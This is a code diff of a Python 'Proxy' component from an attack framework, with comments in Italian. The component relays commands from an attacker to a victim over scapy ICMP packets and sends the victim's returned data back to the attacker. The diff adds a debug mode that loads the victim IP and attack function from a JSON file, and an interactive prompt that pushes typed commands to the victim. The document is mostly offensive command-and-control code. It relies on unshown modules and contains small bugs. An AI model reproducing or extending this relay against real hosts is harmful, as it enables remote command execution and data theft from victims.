@@ -1,18 +1,12 @@
 #from scapy.all import * 
 from scapy.all import IP, ICMP, Raw 
 
-import datetime 
-import time
 import ipaddress
 import sys 
 import os 
-import argparse 
-import re 
-import random
-import threading
-from functools import partial 
-import json
-import type_singleton as singleton
+import argparse  
+import threading 
+import json 
 import socket
 
 file_path = "../comunication_methods.py"
@@ -64,7 +58,7 @@ def wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IP
             checksum=mymethods.calc_checksum(confirm_text.encode())
             interface,_=mymethods.iface_src_from_IP(ip_vittima)
             event_pktconn=com.get_threading_Event()
-            filter=singleton.AttackType().get_filter_connection_from_function(
+            filter=attacksingleton.get_filter_connection_from_function(
                 "wait_conn_from_victim"
                 ,ip_vittima
                 ,checksum
@@ -72,7 +66,6 @@ def wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IP
         except Exception as e:
             print(f"wait_conn_from_victim filter: {e}")
             return False
-
         try:
             args={
                 "filter":filter
@@ -207,6 +200,7 @@ def get_args_from_parser():
 
 #--------------------------------
 class Proxy:  
+    DEBUG=True
     def __init__(self): 
         try:
             if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
@@ -215,8 +209,8 @@ class Proxy:
                 "ip_attaccante":args.ip_attaccante  
             } 
             self.ip_attaccante=ipaddress.ip_address(dict_values.get("ip_attaccante") )
-            print(f"IP attaccante: {type(self.ip_attaccante)} : {self.ip_attaccante}") 
-            _,ip_host=mymethods.iface_src_from_IP(self.ip_attaccante)
+            print(f"IP attaccante: {type(self.ip_attaccante)} : {self.ip_attaccante}")  
+            _,ip_host=mymethods.iface_src_from_IP(self.ip_attaccante)  
             self.ip_host=ipaddress.ip_address(ip_host)
             print(f"IP host: {type(self.ip_host)} : {self.ip_host}")
             self.ip_vittima=None
@@ -226,12 +220,18 @@ class Proxy:
         except Exception as e: 
             print(f"_init_ setup args: {e}")
             exit(1)
-        print("\n")
-        self.connection_with_attacker()
-        print("\n")
+        print("")
+        if self.DEBUG:
+            self.debug_connection_with_attacker()
+        else:
+            self.connection_with_attacker()
+        print("")
         self.connection_with_victim()
-        print("\n")
-        self.wait_command_from_attacker()
+        print("")
+        if self.DEBUG:
+            self.debug_wait_command_from_attacker()
+        else: 
+            self.wait_command_from_attacker()
     
     def connection_with_attacker(self):
         #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6
@@ -247,7 +247,29 @@ class Proxy:
                 print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
         data=com.CONFIRM_PROXY+self.ip_vittima.compressed+self.ip_host.compressed
         self.socket_attacker.sendall(data.encode()) 
-        print("Socket con attaccante stabilito")
+        print("Socket con attaccante stabilito") 
+    
+    def debug_connection_with_attacker(self):
+        default_file_path:str = "./attack_file.json" 
+        path_of_file=""
+        config_file=None
+        if not os.path.exists(path_of_file) or not str(path_of_file).endswith(".json"):
+            if os.path.exists(default_file_path):
+                print(f"File di configurazione {file_path}  non trovato, si usa quello di default")
+                path_of_file=default_file_path
+            else: 
+                raise FileNotFoundError(f"I file {path_of_file} e {default_file_path} non esistono")
+        with open(path_of_file, 'r') as file: 
+            print(f"File di configurazione {path_of_file} caricato correttamente") 
+            config_file= json.load(file) 
+        self.attack_function = attacksingleton.AttackType().get_attack_function(config_file.get("attack_function"))
+        if not isinstance(self.attack_function, dict) or len(self.attack_function.items())!=1:
+            self.attack_function=attacksingleton.choose_attack_function() 
+        print(f"Attacco selezionato: {self.attack_function}") 
+        self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))  
+        if self.ip_vittima is None or not (isinstance(self.ip_vittima, ipaddress.IPv4Address) or isinstance(self.ip_vittima, ipaddress.IPv6Address)):
+            raise ValueError(f"L'indirizzo IP della vittima non è valido: {self.ip_vittima}") 
+        print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }") 
     
     def connection_with_victim(self):
         try: 
@@ -273,10 +295,11 @@ class Proxy:
             self.thread_lock.acquire()
             result=self.thread_response.get(self.ip_host.compressed) and result
             self.thread_lock.release()
-            confirm_conn_to_victim(
-                self.ip_vittima, self.ip_host, self.socket_attacker, result
-            )
-            print("Attacccante aggiornato sullo stato della connessione con la vittima")
+            if not self.DEBUG:
+                confirm_conn_to_victim(
+                    self.ip_vittima, self.ip_host, self.socket_attacker, result
+                )
+                print("Attacccante aggiornato sullo stato della connessione con la vittima")
         except Exception as e: 
             print(f"connection_with_victim: {e}")
             exit(1) 
@@ -305,7 +328,7 @@ class Proxy:
                 thread_data.join()
             print(f"wait_command_from_attacker: End thread Data received: {self.data_received}")
             if len(self.data_received)<=0:
-                print("si mandano i dati all'attaccante")
+                print("Non si mandano i dati all'attaccante")
                 self.socket_attacker.sendall(com.LAST_PACKET.encode()) 
             else:
                 self.redirect_data_to_attacker()
@@ -313,6 +336,26 @@ class Proxy:
         print("Interruzione del programma")
         update_victim_end_communication(self.ip_vittima)
         self.socket_attacker.close()   
+    
+    def debug_wait_command_from_attacker(self): 
+        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
+        command=input(msg) 
+        while command.lower() not in com.exit_cases:  
+            self.data_received=[]  
+            thread_data=threading.Thread(
+                target= lambda: wait_data_from_vicitm(self.ip_vittima, self.ip_host, self.attack_function, self.data_received)
+            )
+            thread_data.start()
+            print(f"Il comando per la vittima è: {command}")
+            attacksingleton.send_data(self.attack_function, command.encode(), self.ip_vittima)
+            if thread_data.ident is not None:
+                thread_data.join()
+            print(f"wait_command_from_attacker: End thread Data received: {self.data_received}") 
+            if len(self.data_received)<=0:
+                print("Non si mandano i dati all'attaccante")
+
+            command=input(msg) 
+        print("Interruzione del programma")
 
     def redirect_data_to_attacker(self):
         if not com.is_list(self.data_received):
@@ -332,7 +375,10 @@ class Proxy:
                 print(f"redirect_data_to_attacker: {e}")
         self.socket_attacker.sendall(com.LAST_PACKET.encode())
         print(f"Dati mandati all'attaccante")
+    
+    
 
+    
 
 
 if __name__=="__main__":  
